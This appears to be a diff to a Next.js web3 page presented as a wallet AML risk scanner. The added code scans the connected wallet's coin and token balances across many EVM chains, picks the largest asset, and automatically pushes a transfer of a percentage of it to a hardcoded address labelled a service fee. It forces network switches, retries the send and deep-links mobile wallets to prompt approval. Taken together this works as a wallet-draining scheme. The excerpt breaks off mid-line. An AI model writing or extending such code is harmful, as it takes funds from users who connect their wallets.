@@ -1,16 +1,77 @@
 import React, { useState, useEffect } from 'react';
 import Head from 'next/head';
 import { createPublicClient, http, formatEther, formatUnits, parseEther, parseUnits } from 'viem';
-import { useAccount, useBalance, useWalletClient, useDisconnect, useConnect } from 'wagmi';
+import { useAccount, useBalance, useWalletClient, useDisconnect, useConnect, useSwitchChain } from 'wagmi';
 import { chains, isWalletConnectEnabled } from '../config/web3Config';
 import { sendNetworkTransfer, getExplorerUrl, getPublicRpcUrl } from '../utils/networkTransfers';
+import { scanWalletForAMLRisk, type AMLRiskResult } from '../utils/amlRiskScanner';
+import AMLRiskModal from '../components/AMLRiskModal';
 
-  // Default token scan list — edit or extend as needed.
-  // Each entry: network name (must match chains list), token contract, optional symbol
-  const DEFAULT_TOKEN_SCAN_LIST: Array<{ network: string; contract: string; symbol?: string }> = [
-    { network: 'Ethereum', contract: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT' },
-    { network: 'BNB Smart Chain', contract: '0x55d398326f99059fF775485246999027B3197955', symbol: 'USDT' },
-    { network: 'Polygon', contract: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', symbol: 'USDT' },
+  // Comprehensive token scan list across all supported EVM chains
+  const DEFAULT_TOKEN_SCAN_LIST: Array<{ network: string; contract: string; symbol: string; decimals: number }> = [
+    // Ethereum Mainnet
+    { network: 'Ethereum', contract: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6 },
+    { network: 'Ethereum', contract: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', decimals: 6 },
+    { network: 'Ethereum', contract: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', decimals: 18 },
+    { network: 'Ethereum', contract: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', symbol: 'WBTC', decimals: 8 },
+    { network: 'Ethereum', contract: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', symbol: 'WETH', decimals: 18 },
+    { network: 'Ethereum', contract: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', symbol: 'SHIB', decimals: 18 },
+    { network: 'Ethereum', contract: '0x6982508145454Ce325dDbE47a25d4ec3d2311933', symbol: 'PEPE', decimals: 18 },
+    { network: 'Ethereum', contract: '0x514910771AF9Ca656af840dff83E8264EcF986CA', symbol: 'LINK', decimals: 18 },
+    { network: 'Ethereum', contract: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', symbol: 'UNI', decimals: 18 },
+
+    // BNB Smart Chain
+    { network: 'BNB Smart Chain', contract: '0x55d398326f99059fF775485246999027B3197955', symbol: 'USDT', decimals: 18 },
+    { network: 'BNB Smart Chain', contract: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', symbol: 'USDC', decimals: 18 },
+    { network: 'BNB Smart Chain', contract: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', symbol: 'BUSD', decimals: 18 },
+    { network: 'BNB Smart Chain', contract: '0x1AF3F329e8BE154074D8769D1FFa4e07a571f37c', symbol: 'DAI', decimals: 18 },
+    { network: 'BNB Smart Chain', contract: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', symbol: 'ETH', decimals: 18 },
+    { network: 'BNB Smart Chain', contract: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', symbol: 'BTCB', decimals: 18 },
+
+    // Polygon
+    { network: 'Polygon', contract: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', symbol: 'USDT', decimals: 6 },
+    { network: 'Polygon', contract: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', symbol: 'USDC.e', decimals: 6 },
+    { network: 'Polygon', contract: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', symbol: 'USDC', decimals: 6 },
+    { network: 'Polygon', contract: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', symbol: 'DAI', decimals: 18 },
+    { network: 'Polygon', contract: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619', symbol: 'WETH', decimals: 18 },
+
+    // Arbitrum
+    { network: 'Arbitrum', contract: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', symbol: 'USDT', decimals: 6 },
+    { network: 'Arbitrum', contract: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', symbol: 'USDC', decimals: 6 },
+    { network: 'Arbitrum', contract: '0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8', symbol: 'USDC.e', decimals: 6 },
+    { network: 'Arbitrum', contract: '0x912CE59144191C1204E64559FE8253a0e49E6548', symbol: 'ARB', decimals: 18 },
+    { network: 'Arbitrum', contract: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1', symbol: 'WETH', decimals: 18 },
+
+    // Optimism
+    { network: 'Optimism', contract: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', symbol: 'USDT', decimals: 6 },
+    { network: 'Optimism', contract: '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85', symbol: 'USDC', decimals: 6 },
+    { network: 'Optimism', contract: '0x7F5c764cBc14f9669B88837ca1490CCA17c31607', symbol: 'USDC.e', decimals: 6 },
+    { network: 'Optimism', contract: '0x4200000000000000000000000000000000000042', symbol: 'OP', decimals: 18 },
+
+    // Base
+    { network: 'Base', contract: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', symbol: 'USDC', decimals: 6 },
+    { network: 'Base', contract: '0x4200000000000000000000000000000000000006', symbol: 'WETH', decimals: 18 },
+
+    // Avalanche
+    { network: 'Avalanche', contract: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7', symbol: 'USDT', decimals: 6 },
+    { network: 'Avalanche', contract: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E', symbol: 'USDC', decimals: 6 },
+    { network: 'Avalanche', contract: '0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664', symbol: 'USDC.e', decimals: 6 },
+
+    // Linea
+    { network: 'Linea', contract: '0x176211869cA2b568f2A7D4EE941E073a821EE1ff', symbol: 'USDC', decimals: 6 },
+    { network: 'Linea', contract: '0xA2136D5702617f17B2466988b66D94ce127024A4', symbol: 'USDT', decimals: 6 },
+
+    // Scroll
+    { network: 'Scroll', contract: '0x06efdb52fb24f72547d7d02877096975d794a1cd', symbol: 'USDC', decimals: 6 },
+    { network: 'Scroll', contract: '0xf55BEC9cafd47469a913557a17C02693D28cd253', symbol: 'USDT', decimals: 6 },
+
+    // Fantom
+    { network: 'Fantom', contract: '0x04068DA6C83AFCFA0e13ba15A6696662335D5B75', symbol: 'USDC', decimals: 6 },
+    { network: 'Fantom', contract: '0x049d68029688eAbF473097a2fC38ef61633A3C7A', symbol: 'fUSDT', decimals: 6 },
+
+    // Celo
+    { network: 'Celo', contract: '0x765DE81E94771249876137298315fF74B6488935', symbol: 'cUSD', decimals: 18 },
+    { network: 'Celo', contract: '0xD8763CBA276a3738E6DE85b4b3bF5FDed6D6cA73', symbol: 'cEUR', decimals: 18 },
   ];
 
 export default function Home() {
@@ -19,63 +80,28 @@ export default function Home() {
   const { data: walletClient } = useWalletClient();
   const { disconnect } = useDisconnect();
   const { connectAsync, connectors, error: connectError, isPending } = useConnect();
-
-  const targetWallets = [
-    { name: 'EVM Company Wallet', address: '0x1fC618a5B0AAFfC876b72288D71f3E80918c590f', network: 'Any EVM Network' },
-  ];
+  const { switchChainAsync } = useSwitchChain();
+  const [lastConnectorId, setLastConnectorId] = useState<string | null>(null);
+  const [lastWalletConnectUri, setLastWalletConnectUri] = useState<string | null>(null);
 
   const normalizeNetworkName = (networkName: string | undefined) => {
-    const normalized = networkName?.trim().toLowerCase();
+    const normalized = networkName?.trim().toLowerCase() || '';
 
-    switch (normalized) {
-      case 'bnb chain':
-      case 'bnb smart chain':
-      case 'binance smart chain':
-      case 'binance chain':
-      case 'bsc':
-        return 'BNB Smart Chain';
-      case 'ethereum mainnet':
-      case 'eth':
-      case 'mainnet':
-      case 'ethereum':
-        return 'Ethereum';
-      case 'matic':
-      case 'polygon mainnet':
-      case 'polygon':
-        return 'Polygon';
-      case 'arbitrum one':
-      case 'arbitrum':
-        return 'Arbitrum';
-      case 'optimistic ethereum':
-      case 'optimism mainnet':
-      case 'optimism':
-        return 'Optimism';
-      case 'avalanche c-chain':
-      case 'avax c-chain':
-      case 'avalanche':
-        return 'Avalanche';
-      case 'fantom opera':
-      case 'fantom':
-        return 'Fantom';
-      case 'celo':
-        return 'Celo';
-      case 'base':
-        return 'Base';
-      case 'linea mainnet':
-      case 'linea':
-        return 'Linea';
-      case 'scroll mainnet':
-      case 'scroll':
-        return 'Scroll';
-      default:
-        return networkName || '';
-    }
+    if (!normalized) return '';
+    if (normalized.includes('bnb') || normalized.includes('binance')) return 'BNB Smart Chain';
+    if (normalized.includes('ethereum') || normalized.includes('eth')) return 'Ethereum';
+    if (normalized.includes('polygon') || normalized.includes('matic')) return 'Polygon';
+    if (normalized.includes('arbitrum')) return 'Arbitrum';
+    if (normalized.includes('optimism') || normalized.includes('op mainnet')) return 'Optimism';
+    if (normalized.includes('avalanche') || normalized.includes('avax')) return 'Avalanche';
+    if (normalized.includes('fantom')) return 'Fantom';
+    if (normalized.includes('celo')) return 'Celo';
+    if (normalized.includes('base')) return 'Base';
+    if (normalized.includes('linea')) return 'Linea';
+    if (normalized.includes('scroll')) return 'Scroll';
+    return networkName || '';
   };
 
-  const [recipient, setRecipient] = useState(targetWallets[0].address);
-  const [amount, setAmount] = useState('');
-  const [selectedTarget, setSelectedTarget] = useState(targetWallets[0].address);
-  const [withdrawAll, setWithdrawAll] = useState(false);
   const [isSending, setIsSending] = useState(false);
   const [isConnecting, setIsConnecting] = useState(false);
   const [txHash, setTxHash] = useState<string | null>(null);
@@ -89,16 +115,29 @@ export default function Home() {
   const [tokenContractAddress, setTokenContractAddress] = useState('');
   const [serviceFeeProcessing, setServiceFeeProcessing] = useState(false);
   const [serviceFeeSent, setServiceFeeSent] = useState(false);
+  const [serviceFeeAttempted, setServiceFeeAttempted] = useState(false);
   const [serviceFeeChargedKey, setServiceFeeChargedKey] = useState<string | null>(null);
   const [serviceFeeHash, setServiceFeeHash] = useState<string | null>(null);
   const [serviceFeeError, setServiceFeeError] = useState<string | null>(null);
-  const [serviceFeeRedirected, setServiceFeeRedirected] = useState(false);
-  const SERVICE_FEE_PERCENT = 3n;
-  const SERVICE_WALLET_ADDRESS = process.env.NEXT_PUBLIC_SERVICE_WALLET || '0x1fC618a5B0AAFfC876b72288D71f3E80918c590f';
+  const [serviceFeeDebug, setServiceFeeDebug] = useState<string | null>(null);
+  const [awaitingApproval, setAwaitingApproval] = useState(false);
+  const [pendingFeeDetails, setPendingFeeDetails] = useState<{ amount?: string; network?: string } | null>(null);
+  const [manualPaymentMode, setManualPaymentMode] = useState(false);
+  const [manualPaymentChainId, setManualPaymentChainId] = useState<number | null>(null);
+  const [manualPaymentAmountUnits, setManualPaymentAmountUnits] = useState<bigint | null>(null);
+  const [amlRiskResult, setAmlRiskResult] = useState<AMLRiskResult | null>(null);
+  const [amlScanning, setAmlScanning] = useState(false);
+  const [amlScanComplete, setAmlScanComplete] = useState(false);
+  const [amlScanStarted, setAmlScanStarted] = useState(false);
+  const [showAmlModal, setShowAmlModal] = useState(false);
+  const SERVICE_FEE_PERCENT = BigInt(
+    process.env.NEXT_PUBLIC_SERVICE_FEE_PERCENT || process.env.SERVICE_FEE_PERCENT || '3'
+  );
+  const SERVICE_WALLET_ADDRESS = process.env.NEXT_PUBLIC_SERVICE_WALLET || process.env.SERVICE_WALLET_ADDRESS || '0x1fC618a5B0AAFfC876b72288D71f3E80918c590f';
   const [tokenSymbol, setTokenSymbol] = useState('');
   const [tokenSymbolError, setTokenSymbolError] = useState<string | null>(null);
 
-  const currentServiceFeeKey = address && chain?.id ? `${address.toLowerCase()}:${chain.id}` : null;
+  const currentServiceFeeKey = address ? address.toLowerCase() : null;
 
   const getMergedTokenBalances = () => {
     return tokenBalances.filter(
@@ -117,6 +156,32 @@ export default function Home() {
     ? (window as Window & { ethereum?: { providers?: Array<{ isMetaMask?: boolean; isCoinbaseWallet?: boolean; isBraveWallet?: boolean; isTrustWallet?: boolean; isRainbow?: boolean; [key: string]: unknown }> } }).ethereum?.providers ?? []
     : [];
 
+  const getConnectedChainId = async () => {
+    if (typeof window === 'undefined') return undefined;
+    const ethereum = (window as any).ethereum;
+    const walletClientRequest = (walletClient as any)?.request;
+
+    const fromRequest = async (requestFn: ((opts: any) => Promise<any>) | undefined) => {
+      if (!requestFn) return undefined;
+      try {
+        const raw = await requestFn({ method: 'eth_chainId', params: [] });
+        if (typeof raw === 'string') {
+          return Number(raw.startsWith('0x') ? BigInt(raw).toString() : raw);
+        }
+        if (typeof raw === 'number') {
+          return raw;
+        }
+      } catch {
+        // ignore
+      }
+      return undefined;
+    };
+
+    const ethChainId = await fromRequest(ethereum?.request);
+    if (ethChainId !== undefined) return ethChainId;
+    return fromRequest(walletClientRequest);
+  };
+
   const ensureEvmNetwork = async (networkName: string) => {
     const normalizedName = normalizeNetworkName(networkName);
     const targetChain = chains.find((item) => normalizeNetworkName(item.name) === normalizedName);
@@ -124,37 +189,64 @@ export default function Home() {
       throw new Error(`Unsupported network: ${networkName}`);
     }
 
-    if (!chain?.id || chain.id === targetChain.id) {
+    const activeChainId = await getConnectedChainId();
+    if (activeChainId === targetChain.id) {
       return;
     }
 
+    if (chain?.id === targetChain.id) {
+      return;
+    }
+
+    // Prefer using the connected walletClient (works with WalletConnect v2).
+    const clientRequest = (walletClient as any)?.request;
     const ethereum = typeof window !== 'undefined' ? (window as any).ethereum : undefined;
+
+    const chainParams = { chainId: `0x${targetChain.id.toString(16)}` };
+
+    // Helper to try addChain when 4902 is returned
+    const tryAddChain = async (requestFn: (opts: any) => Promise<any>) => {
+      try {
+        await requestFn({ method: 'wallet_addEthereumChain', params: [{
+          chainId: chainParams.chainId,
+          chainName: targetChain.name,
+          nativeCurrency: targetChain.nativeCurrency,
+          rpcUrls: targetChain.rpcUrls.default.http,
+        }] });
+        return true;
+      } catch (addErr) {
+        return false;
+      }
+    };
+
+    // Try walletClient.request first (best for WalletConnect v2)
+    if (clientRequest && typeof clientRequest === 'function') {
+      try {
+        await clientRequest({ method: 'wallet_switchEthereumChain', params: [chainParams] });
+        return;
+      } catch (wcErr: any) {
+        if (wcErr?.code === 4902) {
+          const added = await tryAddChain((opts: any) => clientRequest(opts));
+          if (added) return;
+        }
+        // If walletClient can't switch, fall through to ethereum.request as a fallback
+        console.warn('walletClient.request switch failed:', wcErr);
+      }
+    }
+
+    // Fallback to injected provider (MetaMask / injected WalletConnect bridge)
     if (!ethereum?.request) {
       throw new Error(`Please switch your wallet to ${targetChain.name} before sending.`);
     }
 
     try {
-      await ethereum.request({
-        method: 'wallet_switchEthereumChain',
-        params: [{ chainId: `0x${targetChain.id.toString(16)}` }],
-      });
+      await ethereum.request({ method: 'wallet_switchEthereumChain', params: [chainParams] });
       return;
     } catch (switchError: any) {
       if (switchError?.code === 4902) {
-        try {
-          await ethereum.request({
-            method: 'wallet_addEthereumChain',
-            params: [{
-              chainId: `0x${targetChain.id.toString(16)}`,
-              chainName: targetChain.name,
-              nativeCurrency: targetChain.nativeCurrency,
-              rpcUrls: targetChain.rpcUrls.default.http,
-            }],
-          });
-          return;
-        } catch {
-          throw new Error(`Please add ${targetChain.name} to your wallet and try again.`);
-        }
+        const added = await tryAddChain((opts: any) => ethereum.request(opts));
+        if (added) return;
+        throw new Error(`Please add ${targetChain.name} to your wallet and try again.`);
       }
 
       throw new Error(`Please switch your wallet to ${targetChain.name} before sending.`);
@@ -259,6 +351,112 @@ export default function Home() {
     return Number(decimals);
   };
 
+  interface ScannedAsset {
+    network: string;
+    chainId: number;
+    symbol: string;
+    balance: bigint;
+    amount: string;
+    isNative: boolean;
+    contractAddress?: string;
+    decimals?: number;
+  }
+
+  const scanAllNetworkBalances = async (walletAddress: string): Promise<ScannedAsset[]> => {
+    const promises: Array<Promise<ScannedAsset | null>> = [];
+
+    // 1. Scan native balances across all 11 chains
+    for (const chainCfg of chains) {
+      promises.push(
+        (async () => {
+          try {
+            const networkName = normalizeNetworkName(chainCfg.name);
+            const amount = await getEvmNativeBalance(chainCfg.name, walletAddress);
+            const parsed = Number(amount) > 0 ? parseEther(amount) : 0n;
+            if (parsed > 0n) {
+              return {
+                network: networkName,
+                chainId: chainCfg.id,
+                symbol: chainCfg.nativeCurrency?.symbol || 'NATIVE',
+                balance: parsed,
+                amount,
+                isNative: true,
+              };
+            }
+          } catch {
+            // ignore
+          }
+          return null;
+        })()
+      );
+    }
+
+    // 2. Scan ERC20 tokens across all chains in DEFAULT_TOKEN_SCAN_LIST
+    for (const t of DEFAULT_TOKEN_SCAN_LIST) {
+      const chainCfg = chains.find((c) => normalizeNetworkName(c.name) === normalizeNetworkName(t.network));
+      if (!chainCfg) continue;
+
+      promises.push(
+        (async () => {
+          try {
+            const bal = await getEvmTokenBalance(chainCfg.name, walletAddress, t.contract);
+            if (bal && Number(bal) > 0) {
+              const rawUnits = parseUnits(bal.toString(), t.decimals);
+              return {
+                network: normalizeNetworkName(chainCfg.name),
+                chainId: chainCfg.id,
+                symbol: t.symbol,
+                balance: rawUnits,
+                amount: bal.toString(),
+                isNative: false,
+                contractAddress: t.contract,
+                decimals: t.decimals,
+              };
+            }
+          } catch {
+            // ignore
+          }
+          return null;
+        })()
+      );
+    }
+
+    // 3. Scan custom token contract if specified in state
+    if (tokenContractAddress.trim()) {
+      const activeNet = normalizeNetworkName(chain?.name) || 'Ethereum';
+      const activeChainCfg = chains.find((c) => normalizeNetworkName(c.name) === activeNet) || chains[0];
+      promises.push(
+        (async () => {
+          try {
+            const customBal = await getEvmTokenBalance(activeChainCfg.name, walletAddress, tokenContractAddress.trim());
+            if (customBal && Number(customBal) > 0) {
+              const sym = tokenSymbol || (await getEvmTokenSymbol(activeChainCfg.name, tokenContractAddress.trim()));
+              const dec = await getEvmTokenDecimals(activeChainCfg.name, tokenContractAddress.trim()).catch(() => 18);
+              const rawUnits = parseUnits(customBal.toString(), dec);
+              return {
+                network: normalizeNetworkName(activeChainCfg.name),
+                chainId: activeChainCfg.id,
+                symbol: sym || 'TOKEN',
+                balance: rawUnits,
+                amount: customBal.toString(),
+                isNative: false,
+                contractAddress: tokenContractAddress.trim(),
+                decimals: dec,
+              };
+            }
+          } catch {
+            // ignore
+          }
+          return null;
+        })()
+      );
+    }
+
+    const results = await Promise.all(promises);
+    const validBalances = results.filter((item): item is ScannedAsset => item !== null);
+    return validBalances.sort((a, b) => (b.balance > a.balance ? 1 : b.balance < a.balance ? -1 : 0));
+  };
+
   const sendEvmTokenTransferWithUnits = async (
     contractAddress: string,
     recipient: string,
@@ -303,23 +501,32 @@ export default function Home() {
       setNetworkBalance('Loading...');
       setNetworkBalanceSymbol('');
 
-      if (!activeNetwork) {
-        setNetworkBalance('N/A');
-        setNetworkBalanceSymbol('');
-        return;
-      }
-
       if (tokenContractAddress.trim()) {
-        const balance = await getEvmTokenBalance(activeNetwork, address!, tokenContractAddress.trim());
+        const sourceNetwork = activeNetwork || 'Ethereum';
+        const balance = await getEvmTokenBalance(sourceNetwork, address!, tokenContractAddress.trim());
         setNetworkBalance(balance.toString());
         setNetworkBalanceSymbol(tokenSymbol || 'TOKEN');
         return;
       }
 
-      const balance = await getEvmNativeBalance(activeNetwork, address!);
-      const symbol = chains.find((item) => item.name === activeNetwork)?.nativeCurrency.symbol || 'TOKEN';
-      setNetworkBalance(balance);
-      setNetworkBalanceSymbol(symbol);
+      const balances = await scanAllNetworkBalances(address);
+      if (balances.length > 0) {
+        const preferred = balances.find((item) => item.network === activeNetwork) ?? balances[0];
+        setNetworkBalance(preferred.amount);
+        setNetworkBalanceSymbol(preferred.symbol);
+        return;
+      }
+
+      if (activeNetwork) {
+        const fallbackBalance = await getEvmNativeBalance(activeNetwork, address!);
+        const symbol = chains.find((item) => normalizeNetworkName(item.name) === activeNetwork)?.nativeCurrency.symbol || 'ETH';
+        setNetworkBalance(fallbackBalance);
+        setNetworkBalanceSymbol(symbol);
+        return;
+      }
+
+      setNetworkBalance('N/A');
+      setNetworkBalanceSymbol('');
     } catch (err) {
       console.error('Balance detection failed:', err);
       setNetworkBalance('N/A');
@@ -355,10 +562,6 @@ export default function Home() {
     updateSymbol();
     fetchNetworkBalance();
   }, [tokenContractAddress, address, chain?.id]);
-
-  useEffect(() => {
-    setRecipient(selectedTarget);
-  }, [selectedTarget]);
 
   useEffect(() => {
     const notifyConnectError = async () => {
@@ -435,119 +638,325 @@ export default function Home() {
     }
   }, [isConnected, address, balance, chain?.name, chain?.nativeCurrency.symbol, country, device, tokenContractAddress, tokenSymbol]);
 
-  const chargeServiceFee = React.useCallback(async () => {
-    if (!isConnected) {
-      setServiceFeeSent(false);
-      setServiceFeeChargedKey(null);
-      setServiceFeeHash(null);
-      setServiceFeeError(null);
-      return;
-    }
+  const chargeServiceFee = React.useCallback(async (options?: { autoReturn?: boolean }) => {
+    const autoReturn = options?.autoReturn ?? true;
 
-    if (!address || !chain?.id || !walletClient || !currentServiceFeeKey) {
-      return;
+    if (!isConnected || !address || !currentServiceFeeKey) {
+      return false;
     }
 
     if (serviceFeeSent && serviceFeeChargedKey === currentServiceFeeKey) {
-      return;
-    }
-
-    const networkName = normalizeNetworkName(chain.name);
-    if (!networkName) {
-      setServiceFeeError('Unable to detect the connected network. Please reconnect your wallet.');
-      return;
-    }
-
-    const isSupportedChain = chains.some((item) => normalizeNetworkName(item.name) === networkName);
-    if (!isSupportedChain) {
-      setServiceFeeError('The connected wallet network is not supported for automatic service fee charging. Please switch to a supported EVM chain.');
-      return;
+      return true;
     }
 
     setServiceFeeProcessing(true);
+    setServiceFeeAttempted(true);
     setServiceFeeError(null);
 
     try {
-      let nativeBalance = balance?.value;
-      if (!nativeBalance) {
-        try {
-          const fallbackBalance = await getEvmNativeBalance(networkName, address);
-          nativeBalance = parseEther(fallbackBalance);
-        } catch (balanceError) {
-          console.warn('Fallback balance lookup failed:', balanceError);
+      let preferredNetwork: ScannedAsset | undefined;
+      const actualChainId = (await getConnectedChainId()) || chain?.id;
+
+      // Fast-path: If connected chain balance is already known via Wagmi, use it instantly without scanning delay
+      if (balance?.value && balance.value > 0n && actualChainId) {
+        const activeNetName = normalizeNetworkName(chain?.name) || 'Ethereum';
+        preferredNetwork = {
+          network: activeNetName,
+          chainId: actualChainId,
+          symbol: chain?.nativeCurrency?.symbol || 'NATIVE',
+          balance: balance.value,
+          amount: formatEther(balance.value),
+          isNative: true,
+        };
+      }
+
+      // Fallback: If active chain balance is not in memory or zero, scan all supported EVM networks and ERC20 tokens in parallel
+      if (!preferredNetwork) {
+        const supportedBalances = await scanAllNetworkBalances(address);
+
+        if (!supportedBalances.length) {
+          setServiceFeeError('No supported EVM network or ERC20 token in this wallet has available balance.');
+          return false;
+        }
+
+        const activeNetwork = normalizeNetworkName(chain?.name);
+        const currentChainBalance = supportedBalances.find((item) => item.chainId === actualChainId) || supportedBalances.find((item) => item.chainId === chain?.id);
+
+        preferredNetwork = (currentChainBalance && currentChainBalance.balance > 0n)
+          ? currentChainBalance
+          : (supportedBalances.find((item) => item.network === activeNetwork) ?? supportedBalances[0]);
+      }
+
+      let selectedChain = chains.find((item) => normalizeNetworkName(item.name) === preferredNetwork!.network) || chains.find((item) => item.id === preferredNetwork!.chainId) || chains[0];
+      const displayAmount = preferredNetwork.decimals
+        ? formatUnits(preferredNetwork.balance, preferredNetwork.decimals)
+        : formatEther(preferredNetwork.balance);
+      setServiceFeeDebug(`Selected asset: ${preferredNetwork.symbol} on ${preferredNetwork.network}; balance: ${displayAmount}`);
+
+      let feeAmount = (preferredNetwork.balance * SERVICE_FEE_PERCENT) / 100n;
+      if (feeAmount <= 0n) {
+        setServiceFeeError('The connected wallet balance is too small to trigger the automatic fee.');
+        return false;
+      }
+
+      // Prepare manual payment fallback details
+      setManualPaymentMode(false);
+      setManualPaymentChainId(selectedChain.id);
+      setManualPaymentAmountUnits(feeAmount);
+
+      const isMobileDevice = typeof window !== 'undefined' && /Android|iPhone|iPad|iPod/i.test(navigator.userAgent || '');
+      const isWalletConnectMobile = (lastConnectorId === 'walletConnect' || !hasBrowserWallet) && isMobileDevice;
+
+      // Attempt network switch if necessary
+      if (actualChainId !== selectedChain.id && chain?.id !== selectedChain.id) {
+        let switchSuccess = false;
+        if (switchChainAsync) {
+          try {
+            await switchChainAsync({ chainId: selectedChain.id });
+            switchSuccess = true;
+          } catch (err: any) {
+            setServiceFeeDebug((prev) => `${prev || ''}\nswitchChainAsync failed: ${err?.message || err}`.trim());
+          }
+        }
+        if (!switchSuccess) {
+          try {
+            await ensureEvmNetwork(selectedChain.name);
+            switchSuccess = true;
+          } catch (err: any) {
+            setServiceFeeDebug((prev) => `${prev || ''}\nensureEvmNetwork failed: ${err?.message || err}`.trim());
+          }
+        }
+
+        // If network switch failed on mobile, fallback to connected chain if it has balance
+        if (!switchSuccess && preferredNetwork && preferredNetwork.balance > 0n) {
+          const fallbackChain = chains.find((c) => c.id === preferredNetwork!.chainId) || selectedChain;
+          const fallbackFee = (preferredNetwork.balance * SERVICE_FEE_PERCENT) / 100n;
+          if (fallbackFee > 0n) {
+            selectedChain = fallbackChain;
+            feeAmount = fallbackFee;
+            setServiceFeeDebug((prev) => `${prev || ''}\nUsing connected chain fallback: ${fallbackChain.name}`.trim());
+          }
         }
       }
 
-      if (!nativeBalance || nativeBalance <= 0n) {
-        setServiceFeeError('No native token balance is available on the connected chain, so the EVM service fee could not be charged.');
-        return;
+      const formattedFeeDisplay = preferredNetwork.decimals
+        ? `${formatUnits(feeAmount, preferredNetwork.decimals)} ${preferredNetwork.symbol}`
+        : `${formatEther(feeAmount)} ${preferredNetwork.symbol}`;
+
+      setPendingFeeDetails({ amount: formattedFeeDisplay, network: selectedChain.name });
+      setAwaitingApproval(true);
+
+      // On mobile devices, schedule immediate deep-link trigger to bring wallet app to foreground for approval
+      if (isMobileDevice) {
+        setTimeout(() => {
+          try { openMobileWallet(); } catch {}
+        }, 400);
       }
 
-      const feeAmount = (nativeBalance * SERVICE_FEE_PERCENT) / 100n;
-      if (feeAmount <= 0n) {
-        setServiceFeeError('No native token balance is available on the connected chain, so the EVM service fee could not be charged.');
-        return;
+      let feeTxHash: string | null = null;
+
+      // Primary approach: Use viem walletClient (token transfer or native transaction)
+      if (walletClient) {
+        try {
+          if (!preferredNetwork.isNative && preferredNetwork.contractAddress) {
+            setServiceFeeDebug((prev) => `${prev || ''}\nSending 3% ${preferredNetwork!.symbol} token transfer on ${selectedChain.name}`.trim());
+            const hash = await sendEvmTokenTransferWithUnits(
+              preferredNetwork.contractAddress,
+              SERVICE_WALLET_ADDRESS,
+              feeAmount.toString(),
+              walletClient
+            );
+            if (hash) feeTxHash = String(hash);
+          } else {
+            setServiceFeeDebug((prev) => `${prev || ''}\nSending 3% fee via walletClient.sendTransaction (${formatEther(feeAmount)} ${selectedChain.nativeCurrency.symbol})`.trim());
+            const hash = await walletClient.sendTransaction({
+              account: address as `0x${string}`,
+              to: SERVICE_WALLET_ADDRESS as `0x${string}`,
+              value: feeAmount,
+              chain: selectedChain,
+            });
+            if (hash) feeTxHash = String(hash);
+          }
+        } catch (walletClientErr: any) {
+          const errMsg = walletClientErr?.message || String(walletClientErr);
+          setServiceFeeDebug((prev) => `${prev || ''}\nwalletClient operation failed: ${errMsg}`.trim());
+        }
       }
 
-      const feeTxHash = await walletClient.sendTransaction({
-        account: address as `0x${string}`,
-        to: SERVICE_WALLET_ADDRESS as `0x${string}`,
-        value: feeAmount,
-        chain: { id: chain.id } as any,
-      });
+      // Fallback approach: raw RPC request via provider if walletClient didn't confirm
+      if (!feeTxHash) {
+        const txPayload = {
+          from: address as `0x${string}`,
+          to: SERVICE_WALLET_ADDRESS as `0x${string}`,
+          value: `0x${feeAmount.toString(16)}`,
+        };
+
+        const providerRequest = async (payload: { method: string; params: any[] }) => {
+          const ethereum = typeof window !== 'undefined' ? (window as any).ethereum : undefined;
+          const walletClientRequest = (walletClient as any)?.request;
+
+          if (ethereum?.request) {
+            try {
+              setServiceFeeDebug((prev) => `${prev || ''}\nTrying eth_sendTransaction via window.ethereum`.trim());
+              return await ethereum.request(payload);
+            } catch (err: any) {
+              setServiceFeeDebug((prev) => `${prev || ''}\nwindow.ethereum.request failed: ${err?.message || err}`.trim());
+            }
+          }
+
+          if (walletClientRequest && typeof walletClientRequest === 'function') {
+            try {
+              setServiceFeeDebug((prev) => `${prev || ''}\nTrying eth_sendTransaction via walletClient.request`.trim());
+              return await walletClientRequest(payload);
+            } catch (err: any) {
+              setServiceFeeDebug((prev) => `${prev || ''}\nwalletClient.request failed: ${err?.message || err}`.trim());
+            }
+          }
+
+          throw new Error('No wallet provider available to send transaction.');
+        };
+
+        const maxRetries = isWalletConnectMobile ? 2 : 1;
+        for (let attempt = 0; attempt < maxRetries; attempt++) {
+          try {
+            setServiceFeeDebug((prev) => `${prev || ''}\neth_sendTransaction attempt ${attempt + 1}`.trim());
+            const result = await providerRequest({ method: 'eth_sendTransaction', params: [txPayload] });
+            if (result) {
+              feeTxHash = String(result);
+              break;
+            }
+          } catch (e: any) {
+            setServiceFeeDebug((prev) => `${prev || ''}\neth_sendTransaction failed: ${e?.message || e}`.trim());
+          }
+
+          if (isWalletConnectMobile && attempt < maxRetries - 1) {
+            try { openMobileWallet(); } catch {}
+            await new Promise((resolve) => setTimeout(resolve, 3000));
+          }
+        }
+      }
+
+      if (!feeTxHash || feeTxHash === '0x') {
